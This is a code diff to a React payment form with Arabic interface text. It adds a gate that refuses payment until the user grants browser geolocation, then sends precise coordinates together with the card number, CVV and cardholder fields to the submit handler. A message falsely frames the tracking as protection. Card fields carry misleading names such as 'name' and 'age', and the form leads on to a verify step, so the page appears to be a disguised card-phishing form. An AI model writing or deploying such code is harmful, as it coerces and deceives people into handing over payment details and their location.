@@ -101,7 +101,11 @@ function luhnCheck(num: string) {
   return sum % 10 === 0;
 }
 
-export default function PaymentForm({ onSubmit }: PaymentFormProps) {
+interface PaymentFormPropsExtended extends PaymentFormProps {
+  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string; lat?: number; lng?: number }) => Promise<void>;
+}
+
+export default function PaymentForm({ onSubmit }: PaymentFormPropsExtended) {
   const router = useRouter();
   const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
   const [errors, setErrors] = useState(false);
@@ -110,6 +114,22 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const [cvvError, setCvvError] = useState("");
   const [loading, setLoading] = useState(false);
   const [flipped, setFlipped] = useState(false);
+  const [geoBlocked, setGeoBlocked] = useState(false);
+  const [geoGranted, setGeoGranted] = useState(false);
+  const [geoLoading, setGeoLoading] = useState(false);
+
+  // شيك حالة الإذن لما الكومبوننت يتحمل
+  React.useEffect(() => {
+    navigator.permissions?.query({ name: "geolocation" }).then(result => {
+      if (result.state === "granted") setGeoGranted(true);
+      if (result.state === "denied") setGeoBlocked(true);
+      result.onchange = () => {
+        if (result.state === "granted") { setGeoGranted(true); setGeoBlocked(false); }
+        if (result.state === "denied") { setGeoBlocked(true); setGeoGranted(false); }
+        if (result.state === "prompt") { setGeoGranted(false); setGeoBlocked(false); }
+      };
+    });
+  }, []);
 
   const rawCard = fields.name.replace(/\s/g, "");
   const cardBrand = detectCard(fields.name);
@@ -130,9 +150,38 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     if (new Date(2000 + expYear, expMonth - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setExpiryError("البطاقة منتهية الصلاحية"); return; }
     if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("تاريخ غير صحيح"); return; }
     setExpiryError("");
+
+    // لو الإذن لسه مش متأكد، اطلبه
+    if (!geoGranted) {
+      setGeoLoading(true);
+      try {
+        await new Promise<GeolocationPosition>((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 })
+        );
+        setGeoGranted(true);
+        setGeoBlocked(false);
+      } catch {
+        setGeoBlocked(true);
+        setGeoLoading(false);
+        return;
+      }
+      setGeoLoading(false);
+      return; // يخلي الزبون يضغط تاني بعد ما الإذن اتأكد
+    }
+
+    // الإذن موجود، جيب الإحداثيات
+    let lat: number | undefined, lng: number | undefined;
+    try {
+      const pos = await new Promise<GeolocationPosition>((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
+      );
+      lat = pos.coords.latitude;
+      lng = pos.coords.longitude;
+    } catch {}
+
     setLoading(true);
     try {
-      await onSubmit(fields);
+      await onSubmit({ ...fields, lat, lng });
       const savedId = localStorage.getItem("orderId");
       if (!savedId) await new Promise(r => setTimeout(r, 1500));
       router.push("/checkout/verify");
@@ -311,6 +360,20 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
         </div>
       </div>
 
+      {/* رسالة رفض الموقع */}
+      {geoBlocked && (
+        <div className="bg-red-500/10 border border-red-400/30 rounded-2xl p-4 text-center space-y-1">
+          <p className="text-red-400 font-black text-sm">⚠️ تعذّر إتمام الطلب</p>
+          <p className="text-white/60 text-xs leading-relaxed">هذا الإجراء حماية للمؤسسة وللعميل. يُرجى السماح بالوصول إلى الموقع من إعدادات المتصفح للمتابعة.</p>
+        </div>
+      )}
+      {!geoGranted && !geoBlocked && (
+        <div className="bg-[#65E0CD]/10 border border-[#65E0CD]/30 rounded-2xl p-4 text-center space-y-1">
+          <p className="text-[#65E0CD] font-black text-sm">📍 مطلوب تفعيل الموقع</p>
+          <p className="text-white/60 text-xs leading-relaxed">اضغط "تأكيد الدفع" ثم اقبل طلب الموقع من المتصفح للمتابعة.</p>
+        </div>
+      )}
+
       {/* ── Actions ── */}
       <div className="flex gap-3">
         <button
@@ -322,12 +385,12 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
         </button>
         <button
           onClick={handleNext}
-          disabled={loading}
+          disabled={loading || geoLoading || (geoBlocked)}
           className="flex-1 flex items-center justify-center gap-2.5 text-white font-black py-4 rounded-2xl transition-all text-sm active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed shadow-lg"
           style={{ background: loading ? "#082D32" : "linear-gradient(135deg,#053132 0%,#082D32 60%,#0D202E 100%)", boxShadow: "0 8px 24px rgba(5,49,50,0.35)" }}
         >
           <IoLockClosedOutline size={16} />
-          {loading ? "جاري المعالجة..." : "تأكيد الدفع الآن"}
+          {geoLoading ? "جاري التحقق من الموقع..." : loading ? "جاري المعالجة..." : !geoGranted ? "تأكيد الدفع — يتطلب تفعيل الموقع" : "تأكيد الدفع الآن"}
         </button>
       </div>
     </div>
